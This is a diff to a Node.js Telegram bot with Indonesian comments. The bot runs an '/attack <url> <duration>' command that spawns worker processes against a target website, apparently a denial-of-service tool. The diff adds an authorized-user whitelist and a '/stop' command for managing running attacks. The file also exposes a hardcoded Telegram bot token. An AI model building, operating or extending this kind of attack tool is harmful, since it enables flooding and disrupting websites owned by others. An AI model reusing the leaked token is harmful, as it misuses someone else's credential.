@@ -6,6 +6,11 @@ const token = '8962044822:AAGNjh-qyQQsFY6SitarRFMzr5DepQOCNmY';
 
 const bot = new TelegramBot(token, { polling: true });
 
+// --- ID PENGGUNA YANG DIIZINKAN ---
+// Tambahkan ID numerik Telegram Anda di sini untuk keamanan.
+// Anda bisa menambahkan lebih dari satu ID, pisahkan dengan koma.
+const AUTHORIZED_USER_IDS = [8962044822];
+
 let isAttackRunning = false;
 let workers = [];
 let attackTimeout;
@@ -36,6 +41,11 @@ bot.onText(/\/attack(?: (.+) (\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const targetUrl = match[1];
     const duration = parseInt(match[2], 10);
+
+    if (!AUTHORIZED_USER_IDS.includes(msg.from.id)) {
+        bot.sendMessage(chatId, '❌ Anda tidak diizinkan menggunakan perintah ini.');
+        return;
+    }
 
     if (!targetUrl || !duration) {
         const usageMessage = "Format perintah salah.\n\n*Contoh Penggunaan:*\n`/attack https://example.com 120`";
@@ -132,6 +142,26 @@ bot.onText(/\/attack(?: (.+) (\d+))?/, async (msg, match) => {
         workers = [];
         isAttackRunning = false;
     }, (duration + 2) * 1000); // Beri buffer 2 detik untuk laporan terakhir
+});
+
+bot.onText(/\/stop/, (msg) => {
+    const chatId = msg.chat.id;
+
+    if (!AUTHORIZED_USER_IDS.includes(msg.from.id)) {
+        bot.sendMessage(chatId, '❌ Anda tidak diizinkan menggunakan perintah ini.');
+        return;
+    }
+
+    if (isAttackRunning) {
+        clearTimeout(attackTimeout);
+        clearInterval(displayInterval);
+        workers.forEach(worker => worker.kill());
+        workers = [];
+        isAttackRunning = false;
+        bot.sendMessage(chatId, '🛑 Serangan telah dihentikan secara manual.');
+    } else {
+        bot.sendMessage(chatId, 'ℹ️ Tidak ada serangan yang sedang berjalan.');
+    }
 });
 
 bot.on('callback_query', (callbackQuery) => {
